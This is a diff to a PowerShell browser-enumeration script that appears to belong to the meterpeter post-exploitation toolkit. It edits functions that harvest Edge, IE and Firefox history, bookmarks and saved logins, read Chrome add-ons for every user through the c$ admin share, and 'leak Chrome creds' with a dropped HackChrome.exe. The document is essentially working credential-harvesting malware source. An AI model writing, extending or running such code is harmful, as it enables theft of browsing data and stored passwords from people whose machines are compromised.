@@ -327,12 +327,21 @@ function IE_Dump {
         Get-Content "$MsEdgeHistory"|Select-String -Pattern $Regex -AllMatches | % { $_.Matches } | % { $_.Value } | Sort-Object -Unique >> $LogFilePath\BrowserEnum.log
     }
 
-    ## TODO: Retrieve IE Favorites
-    # "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs" (IEFP)
+    ## Retrieve IE Favorites
     echo "`nIE Favorites" >> $LogFilePath\BrowserEnum.log
     echo "------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*")){
-        echo "{Could not find any Favorites}" >> $LogFilePath\BrowserEnum.log
+        If(-not(Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs")){
+            echo "{Could not find any Favorites}" >> $LogFilePath\BrowserEnum.log
+        }else{
+            $LocalDirPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Last Tabs"
+            $ParseFileData = Get-Content "$LocalDirPath"|findstr /I /C:"http" /I /C:"https"
+            $DumpFileData = $ParseFileData -replace '[^a-zA-Z/:. ]',''
+            ForEach ($Token in $DumpFileData){
+                $Token = $Token -replace ' ',''
+                echo "`n" $Token >> $LogFilePath\BrowserEnum.log
+            }        
+        }
     }else{
         $LocalDirPath = "$env:LOCALAPPDATA\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\AC\MicrosoftEdge\User\Default\Favorites\*"
         $DumpFileData = Get-Content "$LocalDirPath" -Raw|findstr /I /C:"http" /C:"https" # Test.txt and test2.txt (test Files) ..
@@ -501,7 +510,6 @@ function FIREFOX {
     }
 
     ## Retrieve FireFox bookmarks
-    # TODO: Need to test it on IEFP computer
     echo "`nFirefox Bookmarks" >> $LogFilePath\BrowserEnum.log
     echo "-----------------" >> $LogFilePath\BrowserEnum.log
     $IPATH = pwd;$AlternativeDir = $False
@@ -536,7 +544,7 @@ function FIREFOX {
             echo "{And Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs}" >> $LogFilePath\BrowserEnum.log
             echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe}" >> $LogFilePath\BrowserEnum.log
             ## mozlz4-win32.exe Firefox Fail dependencie bypass
-            # TODO: I cant use 'ConvertFrom-Json' cmdlet because it gives
+            # I cant use 'ConvertFrom-Json' cmdlet because it gives
             # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
             $Json = Get-Content "$Bookmarks_Path" -Raw
             $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
@@ -561,7 +569,6 @@ function FIREFOX {
     If(Test-Path "$env:tmp\output.jsonlz4"){Remove-Item -Path "$env:tmp\output.jsonlz4" -Force}
 
     ## Retrieve Firefox logins
-    # TODO: Test on IEFP computer
     echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
     echo "------------------" >> $LogFilePath\BrowserEnum.log
     If(-not(Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\logins.json")){
@@ -608,17 +615,6 @@ function CHROME {
             $FinalOut = "StartTime    : {requires Chrome process running}"
         }
         echo "$Status" >> $LogFilePath\BrowserEnum.log
-
-        ## Retrieve Download Pref Settings
-        $Parse_String = $Preferencies_Path.split(",")
-        $Search_Download = $Parse_String|select-string "download" # directory_upgrade
-        $Store_Dump = $Search_Download[1] # download_history Property
-        $Parse_Dump = $Store_Dump -replace '"','' -replace ':','      : ' -replace 'download_history','History'
-        If(-not($Parse_Dump) -or $Parse_Dump -eq $null){
-            echo "History      : {null}" >> $LogFilePath\BrowserEnum.log
-        }else{
-            echo "$Parse_Dump" >> $LogFilePath\BrowserEnum.log
-        }
 
         ## Retrieve Browser accept languages
         $Parse_String = $Preferencies_Path.split(",")
@@ -781,10 +777,10 @@ function ADDONS {
 
     ## Retrieve Chrome addons
     echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
-    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json")){
+    If(-not(Test-Path "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -ErrorAction SilentlyContinue)){
         echo "{None addons found}" >> $LogFilePath\BrowserEnum.log
     }else{
-        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw|ConvertFrom-Json|select *
+        $Json = Get-Content "\\$env:COMPUTERNAME\c$\users\*\appdata\local\Google\Chrome\User Data\Default\Extensions\*\*\manifest.json" -Raw -ErrorAction SilentlyContinue|ConvertFrom-Json|select *
         $Json|select-object -property name,version,update_url >> $LogFilePath\BrowserEnum.log
     }
 }
@@ -833,10 +829,8 @@ function CREDS_DUMP {
         echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
         echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
         # Remove old files
-        If(Test-Path "$env:tmp\HackChrome.exe"){
-            Remove-Item "$env:tmp\HackChrome.exe" -Force
-            Remove-Item "$env:tmp\leakcreds.txt" -Force
-        }
+        Remove-Item "$env:tmp\HackChrome.exe" -Force
+        Remove-Item "$env:tmp\leakcreds.txt" -Force
         echo $storecreds >> $LogFilePath\BrowserEnum.log
         cd $IPATH
     }else{
